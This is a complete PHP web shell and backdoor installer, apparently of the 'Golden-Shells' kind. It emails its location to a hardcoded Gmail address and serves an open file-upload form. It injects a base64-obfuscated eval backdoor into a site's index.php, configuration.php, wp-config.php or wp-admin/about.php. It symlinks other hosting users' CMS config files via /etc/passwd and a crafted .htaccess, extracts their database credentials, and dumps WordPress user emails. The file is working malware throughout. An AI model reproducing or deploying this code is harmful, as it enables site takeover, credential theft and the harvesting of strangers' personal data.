<?php
  error_reporting(0);
ini_set("max_execution_time", 0);
session_start();
if ($_GET["xo"] == "xo") {
    echo '<form action="" method="post" enctype="multipart/form-data">
      <input type="file" name="up"/>
      <input type="submit" name="submit" value="Submit" />
     </form>';
    if ($_POST["submit"]) {
        move_uploaded_file($_FILES["up"]["tmp_name"], $_FILES["up"]["name"]);
        $url = $_FILES["up"]["name"];
        echo "<h1><a href='$url'>Open Shell!</a></h1>";
    }
}
if (!isset($_SESSION["x505golden"])) {
    $_SESSION["x505golden"] = true;
    $curr=basename($_SERVER['SCRIPT_NAME']);
          $back=$_SERVER["HTTP_HOST"].$_SERVER['REQUEST_URI']."?xo=xo";
          $mail="resultinfopp9988@gmail.com";
          $sub="Golden-Shells";
          $body=$back;
          mail($mail,$sub,$body);

	$root=$_SERVER["DOCUMENT_ROOT"];
if(file_exists($root."/index.php") OR file_exists($root."/configuration.php") OR file_exists($root."/wp-config.php")) {
  $index=file_get_contents($root."/index.php");
  $configuration=file_get_contents($root."/configuration.php");
  $wpconfig=file_get_contents($root."/wp-config.php");
  if(!empty($index)) {
    $index=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$index);
    link($root."/index.php",$root."/index.php.bak");
    unlink($root."/index.php");
    $opindex=fopen($root."/index.php","a");
    fwrite($opindex,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
    fwrite($opindex,$index);
    fclose($opindex);
    $indexback=$_SERVER['SERVER_NAME']."/index.php?xo=xo";
  }
  if(!empty($configuration)) {
    $configuration=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$config);
    link($root."/configuration.php",$root."/configuration.php.bak");
    unlink($root."/configuration.php");
    $opcon=fopen($root."/configuration.php","a");
    fwrite($opcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
    fwrite($opcon,$configuration);
    fclose($opcon);
    $configurationback=$_SERVER['SERVER_NAME']."/configuration.php?xo=xo";
  }
  if(!empty($wpconfig)) {
    $wpconfig=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$wpconfig);
    if(is_dir($root."/wp-admin")) {
      chdir($root."wp-admin");
      if(!empty("about.php")) {
        $about=file_get_contents($root."/wp-admin/about.php");
        $about=str_replace(base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"),"",$about);
        unlink($root."/wp-admin/about.php");
        $opabout=fopen($root."/wp-admin/about.php","a");
        fwrite($opabout,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
        fwrite($opabout,$about);
        fclose($opabout);
        $wpadminback=$_SERVER['SERVER_NAME']."/wp-admin/about.php?xo=xo";
      }
    } else {
      link($root."/wp-config.php",$root."/wp-config.bak");
      unlink($root."/wp-config.php");
      $opwpcon=fopen($root."/wp-config.php","a");
      fwrite($opwpcon,base64_decode("PD9waHAgaWYoaXNzZXQoJF9HRVRbIjN4Il0pJiYkX0dFVFsiM3giXT09IjN4Iil7JGZ1bmM9ImNyIi4iZWEiLiJ0ZV8iLiJmdW4iLiJjdGlvbiI7JHg9JGZ1bmMoIlwkYyIsImUiLiJ2Ii4iYWwiLiIoJz8+Jy5iYXNlIi4iNjQiLiJfZGVjIi4ib2RlKFwkYykpOyIpOyR4KCJQRDl3YUhBS0NpUm1hV3hsY3lBOUlFQWtYMFpKVEVWVFd5Sm1hV3hsY3lKZE93cHBaaUFvSkdacGJHVnpXeUp1WVcxbElsMGdJVDBnSnljcElIc0tJQ0FnSUNSbWRXeHNjR0YwYUNBOUlDUmZVa1ZSVlVWVFZGc2ljR0YwYUNKZElDNGdKR1pwYkdWeld5SnVZVzFsSWwwN0NpQWdJQ0JwWmlBb2JXOTJaVjkxY0d4dllXUmxaRjltYVd4bEtDUm1hV3hsYzFzbmRHMXdYMjVoYldVblhTd2dKR1oxYkd4d1lYUm9LU2tnZXdvZ0lDQWdJQ0FnSUdWamFHOGdJanhvTVQ0OFlTQm9jbVZtUFNja1puVnNiSEJoZEdnblBrUnZibVVoSUU5d1pXNDhMMkUrUEM5b01UNGlPd29nSUNBZ2ZRcDlaV05vYnlBblBHaDBiV3crUEdobFlXUStQSFJwZEd4bFBsVndiRzloWkNCbWFXeGxjeTR1TGp3dmRHbDBiR1UrUEM5b1pXRmtQanhpYjJSNVBqeG1iM0p0SUcxbGRHaHZaRDFRVDFOVUlHVnVZM1I1Y0dVOUltMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRWlJR0ZqZEdsdmJqMGlJajQ4YVc1d2RYUWdkSGx3WlQxMFpYaDBJRzVoYldVOWNHRjBhRDQ4YVc1d2RYUWdkSGx3WlQwaVptbHNaU0lnYm1GdFpUMGlabWxzWlhNaVBqeHBibkIxZENCMGVYQmxQWE4xWW0xcGRDQjJZV3gxWlQwaVZWQnNiMkZrSWo0OEwyWnZjbTArUEM5aWIyUjVQand2YUhSdGJENG5Pd28vUGc9PSIpO2V4aXQ7fT8+"));
      fwrite($opwpcon,$wpconfig);
      fclose($opwpcon);
      $wpconfigback=$_SERVER['SERVER_NAME']."/wp-config.php?xo=xo";
    }
  }
  $mailme="resultinfopp9988@gmail.com";
  $subject="Golden-Shells";
  $bodyme=$indexback."\n".$configurationback."\n".$wpconfigback."\n".$wpadminback;
  mail($mailme,$subject,$bodyme);
}
}
function sym() //symlinker function
{
    $dir = file("/etc/passwd");
    mkdir("xo_Goldensm", 0755);
    chdir("xo_Goldensm");
    $ht = 'Options Indexes FollowSymLinks
              DirectoryIndex achon666ju5t.extremecrew
              AddType txt .php
              AddHandler txt .php';
    $file = fopen(".htaccess", "w+");
    fwrite($file, $ht);
    fclose($file);
    $list = Array("wp-config.php", "wp/wp-config.php", "WP/wp-config.php", "wp/beta/wp-config.php", "beta/wp-config.php", "press/wp-config.php", "wordpress/wp-config.php", "Wordpress/wp-config.php", "blog/wp-config.php", "config.php", "news/wp-config.php", "new/wp-config.php", "blogs/wp-config.php", "home/wp-config.php", "db.php", "site/wp-config.php", "main/wp-config.php", "test/wp-config.php", "configuration.php", "blog/configuration.php", "joomla/configuration.php", "cms/configuration.php", "portal/configuration.php", "news/configuration.php", "home/configuration.php", "www/configuration.php", "site/configuration.php", "sites/configuration.php", "vb/includes/config.php", "whm/configuration.php", "central/configuration.php", "whm/whmcs/configuration.php", "whm/WHMCS/configuration.php", "whmc/WHM/configuration.php", "whmcs/configuration.php", "support/configuration.php", "submitticket.php", "whm/configuration.php", "drupal/sites/default/settings.php", "drupal7/sites/default/settings.php", "sites/default/settings.php");
    foreach ($dir as $users) {
        $user = explode(":", $users);
        foreach ($list as $confurl) {
            symlink("/home/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home1/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home2/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home3/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home4/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home5/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home6/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home7/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home8/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            symlink("/home9/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home1/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home2/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home3/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home4/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home5/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home6/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home7/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home8/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
            copy("/home9/" . $user[0] . "/public_html/" . $confurl, $user[0] . "~" . $confurl . ".txt");
        }
    }
    chdir("..");
}
sym();
function getmail() {
    $_total_done = 0;
    $_path = getcwd() . "/xo_Goldensm/";
    if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
        $ssl = "https://";
    } else {
        $ssl = "http://";
    }
    $url = $ssl . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $url = str_replace(basename($_SERVER["SCRIPT_FILENAME"]), "", $url);
    $url = $url . "/xo_Goldensm/";
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $get2 = curl_exec($curl);
    preg_match_all('#<a href="(.*?)"#', $get2, $config);
    foreach ($config[1] as $don) {
        chdir($_path);
        $openht = fopen(".htaccess", "w+");
        fwrite($openht, "Options Indexes FollowSymLinks
      DirectoryIndex achon666ju5t.extremecrew
      AddType txt .php
      AddHandler txt .php
      ReadmeName " . $don);
        fclose($openht);
        $cur = curl_init();
        curl_setopt($cur, CURLOPT_URL, $url);
        curl_setopt($cur, CURLOPT_RETURNTRANSFER, true);
        $get = curl_exec($cur);
        preg_match_all("#'DB_HOST', '(.*?)'#", $get, $host);
        foreach ($host[1] as $don) {
            $host = $don;
        }
        ###
        preg_match_all("#'DB_PASSWORD', '(.*?)'#", $get, $pass);
        foreach ($pass[1] as $done) {
            $password = $done;
        }
        ###
        preg_match_all("#'DB_USER', '(.*?)'#", $get, $user);
        foreach ($user[1] as $done1) {
            $user = $done1;
        }
        ###
        preg_match_all("#'DB_NAME', '(.*?)'#", $get, $name);
        foreach ($name[1] as $done2) {
            $name = $done2;
        }
        ###
        preg_match_all("#$table_prefix  = '(.*?)'#", $get, $prefix);
        foreach ($prefix[1] as $done3) {
            $prefix = $done3;
        }
        $connect = mysqli_connect($host, $user, $password, $name);
        if ($connect) {
            $query1 = mysqli_query($connect, "SELECT `user_email` FROM `wp_users`");
            while ($siteurl = mysqli_fetch_array($query1)) {
                $site_url = $siteurl['user_email'];
                if (!empty($site_url)) {
                    echo $site_url . "<br>";
                }
            }
        }
    }
}
getmail();
?>